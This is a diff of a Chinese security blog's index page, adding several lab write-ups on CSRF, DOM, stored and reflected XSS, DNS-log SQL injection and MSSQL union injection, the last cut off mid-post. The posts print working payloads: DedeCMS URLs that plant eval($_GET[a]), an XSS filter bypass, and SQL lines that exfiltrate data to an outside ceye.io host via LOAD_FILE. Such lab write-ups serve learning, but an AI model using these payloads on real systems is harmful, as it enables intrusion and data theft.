@@ -62,10 +62,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-正则表达式" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-csrf" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/10/14/正则表达式/" class="article-date">
-  <time datetime="2019-10-14T01:02:44.000Z" itemprop="datePublished">2019-10-14</time>
+    <a href="/2019/10/20/csrf/" class="article-date">
+  <time datetime="2019-10-20T13:50:27.000Z" itemprop="datePublished">2019-10-20</time>
 </a>
     
   </div>
@@ -76,7 +76,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/14/正则表达式/">正则表达式</a>
+      <a class="article-title" href="/2019/10/20/csrf/">csrf</a>
     </h1>
   
 
@@ -84,24 +84,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>&lt;?php<br>$key=’flag{*<em>}’;<br>$Regular= preg_match(“/zkaq.key.{2,9}:/./(key</em>key)/i”, trim($_GET[“id”]), $match);<br>if( $Regular ){<br>die(‘key: ‘.$key);<br>}<br>打开靶场，题目如上</p>
-<p>简单分析：</p>
-<p>trim（) 函数处理过的，以get方式传参的id值，这个id的传参经过正则匹配，结果储存到$match</p>
-<p>2.preg_match() 函数</p>
-<p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
-<p>preg_match() 函数第一次匹配成功后就会停止匹配</p>
-<p>3..根据/zkaq.key.{2,9}:/./(key*key)/i 正则表达式，我们可以就可以构造出需要匹配检索的对象trim($_GET[“id”])</p>
-<p>/ ：PHP中使用正则表达式匹配一定要加/</p>
-<p>. ：匹配任意字符</p>
-<p>：匹配前面的子表达式任意次<br>{2,9} ：最少匹配2次且最多匹配9次</p>
-<p>\ ：将下一个字符标记符、或一个向后引用、或一个八进制转义符</p>
-<p>/ ：/一般用于 正则的开始和结束,/是特殊字符 所以中途要使用/就得用\符号来转义了</p>
-<p>i ：不区分大小写<br>所以我决定构造以下id：<br>id=zkaqkey24://keykey<br>然后回车键入<br><img src="https://www.zkaq.org/upload/md/6f7dbfd6c97b90006df8093096711f9f_22869.png" alt><br>成功出现了flag</p>
+        <h2 id="CSRF是什么？-CSRF（Cross-Site-Request-Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的-CSRF攻击的本质原因-CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决-CSRF漏洞原理-因为web应用程序在用户进行敏感操作时-修改密码-转账等-没有校验token或者http请求头的referfer值-从而导致恶意攻击者利用用户身份-cookie-完成攻击行为-简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。-CSRF攻击的原理-CSRF可以干什么-1-盗取或修改账号-2-个人身份泄露以及财产安全-3-对用户的账号进行操作"><a href="#CSRF是什么？-CSRF（Cross-Site-Request-Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的-CSRF攻击的本质原因-CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决-CSRF漏洞原理-因为web应用程序在用户进行敏感操作时-修改密码-转账等-没有校验token或者http请求头的referfer值-从而导致恶意攻击者利用用户身份-cookie-完成攻击行为-简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。-CSRF攻击的原理-CSRF可以干什么-1-盗取或修改账号-2-个人身份泄露以及财产安全-3-对用户的账号进行操作" class="headerlink" title="##CSRF是什么？ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的. CSRF攻击的本质原因 CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决 CSRF漏洞原理: 因为web应用程序在用户进行敏感操作时(修改密码,转账等),没有校验token或者http请求头的referfer值,从而导致恶意攻击者利用用户身份(cookie)完成攻击行为.(简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。) CSRF攻击的原理: CSRF可以干什么: 1.盗取或修改账号 2.个人身份泄露以及财产安全 3.对用户的账号进行操作 "></a>##CSRF是什么？ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的. CSRF攻击的本质原因 CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决 CSRF漏洞原理: 因为web应用程序在用户进行敏感操作时(修改密码,转账等),没有校验token或者http请求头的referfer值,从而导致恶意攻击者利用用户身份(cookie)完成攻击行为.(简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。) CSRF攻击的原理: CSRF可以干什么: 1.盗取或修改账号 2.个人身份泄露以及财产安全 3.对用户的账号进行操作 </h2><h3 id="CSRF工具的防御手段-1-尽量使用POST，限制GET-2-添加验证码-验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击-3-验证referer-HTTP-Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。-4-使用token-这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露-————"><a href="#CSRF工具的防御手段-1-尽量使用POST，限制GET-2-添加验证码-验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击-3-验证referer-HTTP-Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。-4-使用token-这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露-————" class="headerlink" title="CSRF工具的防御手段: 1. 尽量使用POST，限制GET 2. 添加验证码(验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击) 3.验证referer(HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。) 4.使用token(这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露) ————"></a>CSRF工具的防御手段: 1. 尽量使用POST，限制GET 2. 添加验证码(验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击) 3.验证referer(HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。) 4.使用token(这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露) ————</h3><p>##打开靶场： <a href="http://59.63.200.79:8010/csrf/uploads/" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/</a> <img src="/upload/md/b8eb04f50553c9a587682c0879fb7ded_24901.png" alt> 发现是织梦的cms 找后台登录界面： <a href="http://59.63.200.79:8010/csrf/uploads/dede/login.php" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/login.php</a> 试着admin/admin123登录 漏洞原理分析： 参照参考资料 经过代码审计 第一个漏洞代码在:/dede/sys_verifies.php 得知会在/data目录下生成一个inc文件，并且这个inc文件的内容是我们可以控制的，因此只需要再找一个包含了这个inc文件的地方，便可以完成攻击。而且经过分析 另一个包含了这个inc文件 在同一个php文件的下面 参考资料上构造好的payload <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</a> 触发shell <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo()" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo()</a>; 但是这个需要管理员权限才能触发，所以需要利用第二个漏洞 漏洞代码在：/dede/sys_cache_up.php 根据参考资料构造好的payload 传入如下url： <a href="http://59.63.200.79:8010/csrf/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=2334&amp;egroup=;phpinfo();$&amp;issign=1" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=2334&amp;egroup=;phpinfo();$&amp;issign=1</a> 然后被写入了数据库，此时直接查询，便可以写入文件，写文件url如下： <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok</a> 找到网站根目录 读取网站根目录文件 <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=$dir=dirname(&#39;C:/phpStudy/WWW/csrf/uploads/&#39;);$file" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=$dir=dirname(&#39;C:/phpStudy/WWW/csrf/uploads/&#39;);$file</a> = scandir($dir);print_r($file); 读取文件flag.php 找到flag <img src="/upload/md/6d8519f8a2a5f23e558ea7b32ac609cd_74360.png" alt></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/10/14/正则表达式/" data-id="ck1pptq7800004sv09iu9ctnk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/10/20/csrf/" data-id="ck1z1u10p0002ycv06rj9zx8y" class="article-share-link">Share</a>
       
       
     </footer>
@@ -111,10 +99,10 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-dom型xss" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/10/14/hello-world/" class="article-date">
-  <time datetime="2019-10-13T16:06:56.602Z" itemprop="datePublished">2019-10-14</time>
+    <a href="/2019/10/20/dom型xss/" class="article-date">
+  <time datetime="2019-10-20T13:50:07.000Z" itemprop="datePublished">2019-10-20</time>
 </a>
     
   </div>
@@ -125,7 +113,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/14/hello-world/">Hello World</a>
+      <a class="article-title" href="/2019/10/20/dom型xss/">dom型xss</a>
     </h1>
   
 
@@ -133,24 +121,312 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <h2 id="DOM，全称Document-Object-Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。-DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document-object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。"><a href="#DOM，全称Document-Object-Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。-DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document-object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。" class="headerlink" title="#DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。  DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 "></a>#DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 <img src="/upload/md/9e698d849005a5eb42cf2f7e1c6ce47a_76215.png" alt> DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 </h2><p>##可能触发DOM型XSS的属性： document.referer属性 window.name属性 location属性 innerHTML属性 documen.write属性<br>##打开靶场： <img src="/upload/md/e5a29c1bae7d43d76557598f24daac52_53464.png" alt> 注意一下小提示 <img src="/upload/md/43d9027604ede91284564473d2a784b3_38888.png" alt> 在聊天框中输入js弹窗语句，失败 我们删除浏览器的cookie，<br>##在url中输入弹框语句，用uncode编码 成功了<br>##通过xss平台构建短链接 <img src="/upload/md/a637586de8561087cc71de122acbbe94_68339.png" alt> 通过编码，我们将其粘贴至url中 <img src="/upload/md/2cb53e18fa3f523adc28f8c725af7411_30694.png" alt> 成功了，语句被加载 <img src="/upload/md/3cead1950f0882f53b1d77ffa53b4821_24291.png" alt> 根据提示，将刚刚的页面地址加到url=后 <img src="/upload/md/29a922a3f7b85e30d89310df1566c239_50708.png" alt> 等待一会，去xss平台看看结果：</p>
+<h3 id="获取到cookie"><a href="#获取到cookie" class="headerlink" title=" 获取到cookie"></a><img src="/upload/md/b37a9062f24bff0486c0e4e127e863ee_34939.png" alt> 获取到cookie</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/dom型xss/" data-id="ck1z1u10s0004ycv02rqkph4k" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+  
+    <article id="post-存储型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/存储型xss/" class="article-date">
+  <time datetime="2019-10-20T13:49:41.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/存储型xss/">存储型xss</a>
+    </h1>
+  
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="存储型XSS存储型XSS-你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发-持久型-存储型XSS：嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户；"><a href="#存储型XSS存储型XSS-你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发-持久型-存储型XSS：嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户；" class="headerlink" title="存储型XSS存储型XSS (你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发) 持久型/存储型XSS：嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户；"></a>存储型XSS存储型XSS (你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发) 持久型/存储型XSS：嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户；</h1><h1 id="存储型XSS会出现在什么地方？-任何可能插入数据库的地方-比如：-用户注册的时候-留言板-上传文件的文件名-（管理员可见的）报错信息"><a href="#存储型XSS会出现在什么地方？-任何可能插入数据库的地方-比如：-用户注册的时候-留言板-上传文件的文件名-（管理员可见的）报错信息" class="headerlink" title="存储型XSS会出现在什么地方？ 任何可能插入数据库的地方 比如： 用户注册的时候 留言板 上传文件的文件名 （管理员可见的）报错信息"></a>存储型XSS会出现在什么地方？ 任何可能插入数据库的地方 比如： 用户注册的时候 留言板 上传文件的文件名 （管理员可见的）报错信息</h1><p>#打开靶场： <img src="/upload/md/cf7b39f9f4ed16456439b513cfcb3e5f_82522.png" alt><br>##先信息收集 发现靶场是finecms5.3 当访问页面不存在的方法或对象时，会调用show_404方法，且该方法没有过滤html敏感字符。</p>
+<h3 id="试着在登录页面的url中加入js弹窗语句成功了-通过xss平台在url中加入获取cookie的代码-成功拿到cookie"><a href="#试着在登录页面的url中加入js弹窗语句成功了-通过xss平台在url中加入获取cookie的代码-成功拿到cookie" class="headerlink" title=" 试着在登录页面的url中加入js弹窗语句成功了  通过xss平台在url中加入获取cookie的代码  成功拿到cookie"></a><img src="/upload/md/ec200dae8e005b8d659462067c11605a_26413.png" alt> 试着在登录页面的url中加入js弹窗语句成功了 <img src="/upload/md/944f17dfb1a0204298d0184664aafe66_17110.png" alt> 通过xss平台在url中加入获取cookie的代码 <img src="/upload/md/b09cad3ee6a1f53be19abb7504ec2302_27491.png" alt> 成功拿到cookie</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/存储型xss/" data-id="ck1z1u10z000aycv02adwswqc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+  
+    <article id="post-反射性xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/反射性xss/" class="article-date">
+  <time datetime="2019-10-20T13:49:16.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/反射性xss/">反射性xss</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。<br>#话不多说，开靶场： <img src="/upload/md/286f1839e5b0d8e33972f862f705f0dc_64507.png" alt> 试试学的js弹窗语句： <img src="/upload/md/981e904c2b14e4e1efd672575d0c8e3a_51308.png" alt> 好像无效，f12看看 <img src="/upload/md/0bb635f9287805b22b9f92034bc062cf_10800.png" alt><br>#有两个双引号把语句当成字符串了 然后用’ //注释点双引号 又发现&lt;被转义成&amp;lt了 现在就只能用不带&lt;的语句了 我们用构造函数oninput函数弹框： ‘oninput=alert(2)// 单引号闭合前面的引号，用//注释后面的语句 <img src="/upload/md/8a256a44017329186a92813826746a56_87729.png" alt></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/10/14/hello-world/" data-id="ck1pptq7j00024sv0358hd36k" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/10/20/反射性xss/" data-id="ck1z1u10w0008ycv0pwxmpd65" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-dns注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/dns注入/" class="article-date">
+  <time datetime="2019-10-20T13:48:50.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/dns注入/">dns注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首先，DNS注入并不是是对DNS服务器进行注入，而是利用DNS在解析的时候会留下的有用的日志，简称：DNS log注入。 </p>
+<h1 id="打开靶场-url中直接注入当前php文件是不行的，使用十六进制（and-16-616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参-1-打开http-ceye-io，看一下payload-SELECT-LOAD-FILE-CONCAT-‘-‘-SELECT-password-FROM-mysql-user-WHERE-user-’root’-LIMIT-1-’-mysql-ip-port-b182oj-ceye-io-abc’"><a href="#打开靶场-url中直接注入当前php文件是不行的，使用十六进制（and-16-616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参-1-打开http-ceye-io，看一下payload-SELECT-LOAD-FILE-CONCAT-‘-‘-SELECT-password-FROM-mysql-user-WHERE-user-’root’-LIMIT-1-’-mysql-ip-port-b182oj-ceye-io-abc’" class="headerlink" title="打开靶场  url中直接注入当前php文件是不行的，使用十六进制（and(16)=616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参  1.打开http://ceye.io，看一下payload SELECT LOAD_FILE(CONCAT(‘\\‘,(SELECT password FROM mysql.user WHERE user=’root’ LIMIT 1),’.mysql.ip.port.b182oj.ceye.io\abc’));"></a>打开靶场 <img src="/upload/md/e5035ce232ef8c1bcf5437c742bb830d_51156.png" alt> url中直接注入当前php文件是不行的，使用十六进制（and(16)=616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参 <img src="/upload/md/734bc7111c977556295769f6b57184ab_21679.png" alt> 1.打开<a href="http://ceye.io，看一下payload" target="_blank" rel="noopener">http://ceye.io，看一下payload</a> SELECT LOAD_FILE(CONCAT(‘\\‘,(SELECT password FROM mysql.user WHERE user=’root’ LIMIT 1),’.mysql.ip.port.b182oj.ceye.io\abc’));</h1><p>#2.构建我们的查询语句，首先查看表： and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),’.8vlehu.ceye.io\abc’)))# 网站里看到DNS解析为admin.8vlehu.ceye.io，也就是说第一个表是admin <img src="/upload/md/783f5a47d55542d98bb0700fc9278bf2_97052.png" alt><br>#3.由于tips提示我们flag就在admin表里，于是我们看一下字段： and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select column_name from information_schema.columns where table_name = ‘admin’ LIMIT 0,1),’.8vlehu.ceye.io\abc’)))# 回显为Id.8vlehu.ceye.io，也就是说第一个字段为Id and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select column_name from information_schema.columns where table_name = ‘admin’ LIMIT 1,1),’.8vlehu.ceye.io\abc’)))# 回显为username.8vlehu.ceye.io，也就是说第二个字段为username 继续，第三个字段为password<br>#4.我们看一下password： and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select password from admin LIMIT 0,1),’.8vlehu.ceye.io\abc’)))#<br>#5.回显为：1flag1good1.8vlehu.ceye.io 输入这个密码，恭喜通关~ <img src="/upload/md/ce4a18738c72d4087292ac71db81f8bd_64081.png" alt> flag：1flag1good1</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/dns注入/" data-id="ck1z1u10r0003ycv0t4ydqv71" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-mssql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/mssql注入/" class="article-date">
+  <time datetime="2019-10-20T13:48:26.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/mssql注入/">mssql注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>MS SQL是微软推出的商用数据库系统，全称是Microsoft SQL Sever。MSSQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是Sybase，同时微软也和Sybase合作过 SQL Server 4.2版本的研发，微软亦将SQL。目前的大型网站一般使用Oracle或者MSSQLJSP.PHP.ASP都可以。一般是企业级的商务网站使用的。MS SQL Server 和ASP都是微软的产品，互相兼容性最好，所以ASP的网站用MS SQL Server是黄金搭档。 </p>
+<h3 id="MSSQL显错注入-在讲MSSQL反弹注入前先说一下MSSQL的显错注入-MSSQL联合查询：UNION-ALL-然后猜出输出点要使用null去填充，比如：-没有sql的union-select-1-2-3-改为-union-all-select-null-null-null-注释：注释只有–-select-name-from-master-dbo-sysdatabase-查询系统库-查询系统表：dbo-sysobjects-查询系统表-xtype-”U”-dbo-syscolumns-字段-id-指定id-反弹注入：-反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内-需要用到opendatasource函数-—-title-MSSQL注入-反弹注入-通过观察或者order-by可以得出这里有三个字段，输入一下语句：-id-1’union-all-select-null-null-null-from-admin–-注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。-通过以下语句：-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects–-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-id-1977058079–-id-2’-and-1-2-union-all-select-id-passwd-token-from-admin–-MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结